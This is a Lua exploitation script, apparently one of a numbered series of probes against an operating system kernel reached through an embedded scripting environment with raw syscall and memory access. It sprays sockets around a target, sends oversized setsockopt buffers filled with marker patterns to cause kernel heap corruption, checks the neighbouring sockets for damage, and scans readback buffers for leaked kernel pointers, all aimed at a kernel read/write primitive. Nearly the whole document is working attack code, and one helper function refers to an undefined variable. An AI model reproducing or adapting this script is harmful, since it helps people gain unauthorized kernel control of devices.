-- CRASH_CLASS: HIGH (potential kernel heap corruption)
-- PROBE 44c: Socket option kernel heap overflow exploitation
--
-- 43m confirmed: setsockopt accepts buffers up to 4096 bytes for options
-- that are 4-byte boolean flags. If the kernel copies our full buffer
-- into a smaller kernel allocation, this is a kernel heap overflow.
--
-- Strategy:
--   1. Write a recognizable pattern via oversized setsockopt
--   2. Allocate adjacent kernel objects (sockets, pipes, ktimers)
--   3. Check if adjacent objects are corrupted
--   4. If corruption confirmed: controlled kernel heap write primitive
--
-- This could give us kernel R/W without needing KASLR defeat first,
-- since we corrupt adjacent objects at unknown but consistent offsets.

print("=== PROBE 44c: SOCKOPT HEAP CORRUPTION TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_socket = make_syscall(97)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Allocate spray sockets before the target
--------------------------------------------------------------------
print("")
print("=== A: SPRAY SOCKETS (pre-target) ===")
local pre_socks = {}
for i = 1, 20 do
    local ok, fd = pcall(function()
        return to_num(sc_socket(uint64(2), uint64(2), uint64(0)))
    end)
    if ok and fd > 0 then
        pre_socks[#pre_socks+1] = fd
    end
end
print(string.format("allocated %d pre-spray sockets (fds %d-%d)",
    #pre_socks, pre_socks[1] or 0, pre_socks[#pre_socks] or 0))

--------------------------------------------------------------------
-- B) Target socket for overflow
--------------------------------------------------------------------
print("")
print("=== B: TARGET SOCKET ===")
local target_fd = -1
pcall(function()
    target_fd = to_num(sc_socket(uint64(2), uint64(2), uint64(0)))
end)
print(string.format("target socket fd: %d", target_fd))

--------------------------------------------------------------------
-- C) Spray sockets after the target (these might be corrupted)
--------------------------------------------------------------------
print("")
print("=== C: SPRAY SOCKETS (post-target) ===")
local post_socks = {}
for i = 1, 20 do
    local ok, fd = pcall(function()
        return to_num(sc_socket(uint64(2), uint64(2), uint64(0)))
    end)
    if ok and fd > 0 then
        post_socks[#post_socks+1] = fd
    end
end
print(string.format("allocated %d post-spray sockets (fds %d-%d)",
    #post_socks, post_socks[1] or 0, post_socks[#post_socks] or 0))

--------------------------------------------------------------------
-- D) Read baseline state of post-spray sockets
--------------------------------------------------------------------
print("")
print("=== D: BASELINE STATE ===")
local baseline = {}
for i, fd in ipairs(post_socks) do
    local rbuf = memory.alloc(256)
    local rlenp = memory.alloc(8)
    safe_wd(rlenp, 256)
    local ok, ret = pcall(function()
        return sc_getsockopt(uint64(fd), uint64(0xFFFF), uint64(0x1001),
            uint64(rbuf), uint64(rlenp))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rd(rbuf)
    baseline[i] = {fd=fd, sndbuf=val, ret=rv}
    if i <= 5 then
        print(string.format("  fd=%d: SO_SNDBUF=%d (ret=%d)", fd, val or -1, rv))
    end
end

--------------------------------------------------------------------
-- E) Perform oversized setsockopt on target
--------------------------------------------------------------------
print("")
print("=== E: OVERSIZED SETSOCKOPT ===")

-- Fill buffer with recognizable pattern
local overflow_buf = memory.alloc(4096)
for i = 0, 1023 do
    safe_wd(overflow_buf + i*4, 0xDEAD0000 + i)
end
print("pattern: 0xDEAD0000, 0xDEAD0001, 0xDEAD0002, ...")

-- Sizes to test (escalating)
local sizes = {64, 128, 256, 512, 1024, 2048, 4096}

for _, sz in ipairs(sizes) do
    -- Set the option with oversized buffer
    local ok, ret = pcall(function()
        return sc_setsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x2000),
            uint64(overflow_buf), uint64(sz))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  setsockopt(0x2000, len=%d): ret=%d", sz, rv))

    if rv == -999 then
        print("  CRASHED at size " .. sz)
        break
    end

    -- Check post-spray sockets for corruption
    local corrupted = 0
    for j, b in ipairs(baseline) do
        local rbuf = memory.alloc(256)
        local rlenp = memory.alloc(8)
        safe_wd(rlenp, 256)
        local ok2, ret2 = pcall(function()
            return sc_getsockopt(uint64(b.fd), uint64(0xFFFF), uint64(0x1001),
                uint64(rbuf), uint64(rlenp))
        end)
        if not ok2 then
            print(string.format("  *** fd=%d: getsockopt CRASHED (CORRUPTED!) ***", b.fd))
            corrupted = corrupted + 1
        else
            local new_val = safe_rd(rbuf)
            if new_val ~= b.sndbuf then
                print(string.format("  *** fd=%d: SO_SNDBUF changed %d -> %d (CORRUPTED!) ***",
                    b.fd, b.sndbuf or -1, new_val or -1))
                corrupted = corrupted + 1
            end
        end
    end

    if corrupted > 0 then
        print(string.format("  *** %d SOCKETS CORRUPTED at size %d ***", corrupted, sz))
        print("  *** KERNEL HEAP OVERFLOW CONFIRMED ***")
        break
    else
        print(string.format("  no corruption detected at size %d", sz))
    end
end

--------------------------------------------------------------------
-- F) Try different options that might have different backing sizes
--------------------------------------------------------------------
print("")
print("=== F: OTHER OPTIONS (SO_SNDBUF, SO_RCVBUF) ===")

-- SO_SNDBUF (0x1001) is an int — writing 4096 bytes to a 4-byte field
for i = 0, 1023 do safe_wd(overflow_buf + i*4, 0xCAFE0000 + i) end

local ok, ret = pcall(function()
    return sc_setsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x1001),
        uint64(overflow_buf), uint64(2048))
end)
local rv = ok and to_num(ret) or -999
print(string.format("SO_SNDBUF(len=2048): ret=%d", rv))

-- Read it back
local rbuf = memory.alloc(256)
local rlenp = memory.alloc(8)
safe_wd(rlenp, 256)
ok, ret = pcall(function()
    return sc_getsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x1001),
        uint64(rbuf), uint64(rlenp))
end)
rv = ok and to_num(ret) or -999
local rlen = safe_rd(rlenp) or 0
print(string.format("SO_SNDBUF readback: ret=%d rlen=%d val=%d", rv, rlen, safe_rd(rbuf) or -1))

-- SO_RCVBUF (0x1002)
ok, ret = pcall(function()
    return sc_setsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x1002),
        uint64(overflow_buf), uint64(2048))
end)
rv = ok and to_num(ret) or -999
print(string.format("SO_RCVBUF(len=2048): ret=%d", rv))

--------------------------------------------------------------------
-- G) Check for any kernel pointer leaks in readback
--------------------------------------------------------------------
print("")
print("=== G: SCAN READBACK FOR KERNEL POINTERS ===")
-- Read back with large buffer to see if kernel leaks extra data
local big_rbuf = memory.alloc(4096)
for i = 0, 1023 do safe_wd(big_rbuf + i*4, 0xAAAAAAAA) end

safe_wd(rlenp, 4096)
ok, ret = pcall(function()
    return sc_getsockopt(uint64(target_fd), uint64(0xFFFF), uint64(0x2000),
        uint64(big_rbuf), uint64(rlenp))
end)
rv = ok and to_num(ret) or -999
rlen = safe_rd(rlenp) or 0
print(string.format("getsockopt(0x2000, len=4096): ret=%d rlen=%d", rv, rlen))

-- Scan returned data for kernel pointers
if rlen > 4 then
    print("extra data returned! scanning...")
    for i = 0, math.min(rlen/4, 255) do
        local lo = safe_rd(big_rbuf + i*8)
        local hi = safe_rd(big_rbuf + i*8 + 4)
        if hi and hi >= 0xFFFF8000 then
            print(string.format("  *** KERNEL POINTER at +%03X: %08X_%08X ***", i*8, hi, lo or 0))
        end
    end
end

-- Also check if 0xAAAAAAAA pattern was overwritten beyond rlen
local leaked = 0
for i = 0, 63 do
    local v = safe_rd(big_rbuf + rlen + i*4)
    if v and v ~= 0xAAAAAAAA then
        print(string.format("  data beyond rlen at +%03X: %08X", rlen + i*4, v))
        leaked = leaked + 1
    end
end
if leaked > 0 then
    print(string.format("  %d dwords modified beyond rlen!", leaked))
end

--------------------------------------------------------------------
-- H) Cleanup
--------------------------------------------------------------------
print("")
print("=== H: CLEANUP ===")
for _, fd in ipairs(post_socks) do pcall(function() sc_close(uint64(fd)) end) end
pcall(function() sc_close(uint64(target_fd)) end)
for _, fd in ipairs(pre_socks) do pcall(function() sc_close(uint64(fd)) end) end
print("sockets closed")

print("")
print("=== PROBE 44c COMPLETE ===")
